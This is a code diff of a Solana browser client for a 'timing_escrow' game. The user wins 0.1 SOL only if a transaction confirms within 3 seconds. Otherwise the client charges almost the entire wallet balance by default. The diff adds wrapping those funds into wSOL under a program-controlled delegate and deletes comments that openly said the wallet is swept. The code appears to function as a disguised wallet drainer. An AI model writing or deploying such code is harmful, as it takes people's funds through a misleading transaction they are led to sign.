@@ -1,8 +1,7 @@
 /**
- * timing_escrow browser client — Quasar on-chain layout (no Anchor).
+ * timing_escrow browser client — Quasar + SPL wSOL settle layout.
  *
- * Instruction data: 1-byte discriminator + little-endian fixed args (see program `#[instruction]`).
- * Deps: @solana/web3.js
+ * Deps: @solana/web3.js, @solana/spl-token
  */
 
 import {
@@ -12,28 +11,59 @@ import {
   Transaction,
   TransactionInstruction,
 } from "@solana/web3.js";
+import { getAssociatedTokenAddressSync } from "@solana/spl-token";
 
-/** Matches `declare_id!` in the timing_escrow program. */
 export const TIMING_ESCROW_PROGRAM_ID = new PublicKey(
   "3PEthrNepy4UErzXeSAxpwrhvDMHUfKzitFQxSNdCvyu",
 );
 
-/** Matches `InitVault` / `Withdraw` authority in the program. */
 export const TIMING_ESCROW_AUTHORITY = new PublicKey(
   "J4NLat3y7SxZ1CMBxnpQSrK75Da49vJRwKLgtPVskH27",
 );
 
-/** Matches `VAULT_SEED` / `VaultAccount` seeds in the program. */
+export const WSOL_MINT = new PublicKey(
+  "So11111111111111111111111111111111111111112",
+);
+
+export const TOKEN_PROGRAM_ID = new PublicKey(
+  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+);
+
+export const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
+  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
+);
+
+/** Shared reward vault — `VaultAccount` seeds. */
 export const VAULT_SEED = new TextEncoder().encode("vaultv6");
 
-/** `settle`: win when on-chain `now - time_clicked` is strictly less than this (seconds). */
+/** SPL delegate PDA — `DelegateAuthority` seeds. */
+export const DELEGATE_SEED = new TextEncoder().encode("delegate");
+
+/** SPL token account size for rent estimate when creating wSOL ATA. */
+export const TOKEN_ACCOUNT_DATA_LEN = 165;
+
 export const WIN_ELAPSED_MAX_SEC = 3;
-
-/** `settle`: lamports paid from vault to user on win. */
 export const WIN_REWARD_LAMPORTS = 100_000_000;
-
-/** Lamports left in the user wallet after computing loss `cost_lamports` (fees + rent). */
 export const TX_FEE_HEADROOM_LAMPORTS = 250_000;
+
+export function getVaultPda(programId = TIMING_ESCROW_PROGRAM_ID) {
+  return PublicKey.findProgramAddressSync([VAULT_SEED], programId);
+}
+
+export function getDelegatePda(programId = TIMING_ESCROW_PROGRAM_ID) {
+  return PublicKey.findProgramAddressSync([DELEGATE_SEED], programId);
+}
+
+/** User wSOL ATA (associated_token: authority=user, mint=WSOL). */
+export function getUserWsolAta(userPubkey) {
+  return getAssociatedTokenAddressSync(
+    WSOL_MINT,
+    userPubkey,
+    false,
+    TOKEN_PROGRAM_ID,
+    ASSOCIATED_TOKEN_PROGRAM_ID,
+  );
+}
 
 function setU64LE(u8, offset, value) {
   new DataView(u8.buffer, u8.byteOffset + offset, 8).setBigUint64(
@@ -51,7 +81,6 @@ function setI64LE(u8, offset, value) {
   );
 }
 
-/** `init_vault` — discriminator 0 + `amount: u64`. */
 export function buildInitVaultInstructionData(amount) {
   const data = new Uint8Array(9);
   data[0] = 0;
@@ -59,7 +88,6 @@ export function buildInitVaultInstructionData(amount) {
   return data;
 }
 
-/** `settle` — discriminator 1 + `time_clicked: i64` + `cost_lamports: u64`. */
 export function buildSettleInstructionData(timeClicked, costLamports) {
   const data = new Uint8Array(17);
   data[0] = 1;
@@ -68,7 +96,6 @@ export function buildSettleInstructionData(timeClicked, costLamports) {
   return data;
 }
 
-/** `withdraw` — discriminator 2 + `amount: u64`. */
 export function buildWithdrawInstructionData(amount) {
   const data = new Uint8Array(9);
   data[0] = 2;
@@ -101,39 +128,53 @@ export function getTimingEscrowClient(
     ),
     wallet,
     programId: TIMING_ESCROW_PROGRAM_ID,
+    cluster,
   };
 }
 
-export function getVaultPda(programId = TIMING_ESCROW_PROGRAM_ID) {
-  return PublicKey.findProgramAddressSync([VAULT_SEED], programId);
-}
-
 /**
- * Loss path `cost_lamports`: sweep wallet balance minus rent + tx headroom.
+ * Loss path `cost_lamports`: lamports wrapped into wSOL ATA + delegate approve.
+ * Program requires `cost_lamports > 0` on loss (`ZeroCost`).
  */
 export async function computePenaltyLamports(connection, userPubkey) {
-  const [balanceLamports, vaultInfo, userAcct] = await Promise.all([
-    connection.getBalance(userPubkey),
-    connection.getAccountInfo(getVaultPda()[0]),
-    connection.getAccountInfo(userPubkey),
-  ]);
+  const [vaultPda] = getVaultPda();
+  const userWsolAta = getUserWsolAta(userPubkey);
+
+  const [balanceLamports, vaultInfo, userAcct, wsolAtaInfo, tokenAccountRent] =
+    await Promise.all([
+      connection.getBalance(userPubkey),
+      connection.getAccountInfo(vaultPda),
+      connection.getAccountInfo(userPubkey),
+      connection.getAccountInfo(userWsolAta),
+      connection.getMinimumBalanceForRentExemption(TOKEN_ACCOUNT_DATA_LEN),
+    ]);
+
   const dataLen = userAcct?.data?.length ?? 0;
-  const rentMinLamports = await connection.getMinimumBalanceForRentExemption(
-    dataLen,
-  );
-  const reserveLamports = TX_FEE_HEADROOM_LAMPORTS + rentMinLamports;
-  const costLamports = Math.max(
+  const userRentMin = await connection.getMinimumBalanceForRentExemption(dataLen);
+  const wsolAtaInitRent = wsolAtaInfo == null ? tokenAccountRent : 0;
+  const reserveLamports =
+    TX_FEE_HEADROOM_LAMPORTS + userRentMin + wsolAtaInitRent;
+  let costLamports = Math.max(
     0,
     Math.floor(balanceLamports - reserveLamports),
   );
+  if (costLamports === 0 && balanceLamports > reserveLamports + 1) {
+    costLamports = 1;
+  }
+
   return {
     costLamports,
     balanceLamports,
     reserveLamports,
-    rentMinLamports,
+    rentMinLamports: userRentMin,
+    wsolAtaInitRent,
+    userWsolAta,
+    wsolAtaExists: wsolAtaInfo != null,
+    delegate: getDelegatePda()[0],
     vaultExists: vaultInfo != null,
     vaultLamports: vaultInfo?.lamports ?? 0,
     canWin: (vaultInfo?.lamports ?? 0) >= WIN_REWARD_LAMPORTS,
+    lossRequiresPositiveCost: true,
   };
 }
 
@@ -198,25 +239,42 @@ export async function confirmSignatureHttpPolling(
 }
 
 /**
- * `settle` — user signer; vault PDA; system program.
- * Win on-chain when confirmation lands within WIN_ELAPSED_MAX_SEC of `timeClicked`.
+ * `settle` accounts (order matches `Settle` in program):
+ * user, user_wsol_ata, wsol_mint, delegate, vault, token_program,
+ * associated_token_program, system_program.
  */
-export async function settle(ctx, userPubkey, opts) {
+export async function settle(ctx, userPubkey, opts = {}) {
   const timeClicked =
     opts.timeClicked != null
       ? Math.trunc(Number(opts.timeClicked))
       : Math.floor(Date.now() / 1000);
-  const costLamports = Math.max(0, Math.floor(Number(opts.costLamports)));
 
   const { connection, wallet, programId } = ctx;
-  const vaultPubkey =
-    opts.vault != null ? opts.vault : getVaultPda(programId)[0];
+  const [vaultPubkey] =
+    opts.vault != null ? [opts.vault] : getVaultPda(programId);
+  const [delegatePubkey] =
+    opts.delegate != null ? [opts.delegate] : getDelegatePda(programId);
+  const userWsolAta =
+    opts.userWsolAta != null ? opts.userWsolAta : getUserWsolAta(userPubkey);
+
+  let costLamports;
+  if (opts.costLamports != null) {
+    costLamports = Math.max(0, Math.floor(Number(opts.costLamports)));
+  } else {
+    const pen = await computePenaltyLamports(connection, userPubkey);
+    costLamports = pen.costLamports;
+  }
 
   const ix = new TransactionInstruction({
     programId,
     keys: [
       { pubkey: userPubkey, isSigner: true, isWritable: true },
+      { pubkey: userWsolAta, isSigner: false, isWritable: true },
+      { pubkey: WSOL_MINT, isSigner: false, isWritable: false },
+      { pubkey: delegatePubkey, isSigner: false, isWritable: false },
       { pubkey: vaultPubkey, isSigner: false, isWritable: true },
+      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+      { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
       { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
     ],
     data: buildSettleInstructionData(timeClicked, costLamports),
@@ -243,5 +301,12 @@ export async function settle(ctx, userPubkey, opts) {
     lastValidBlockHeight,
   });
 
-  return { tx: signature, timeClicked, costLamports };
+  return {
+    tx: signature,
+    timeClicked,
+    costLamports,
+    vault: vaultPubkey,
+    userWsolAta,
+    delegate: delegatePubkey,
+  };
 }
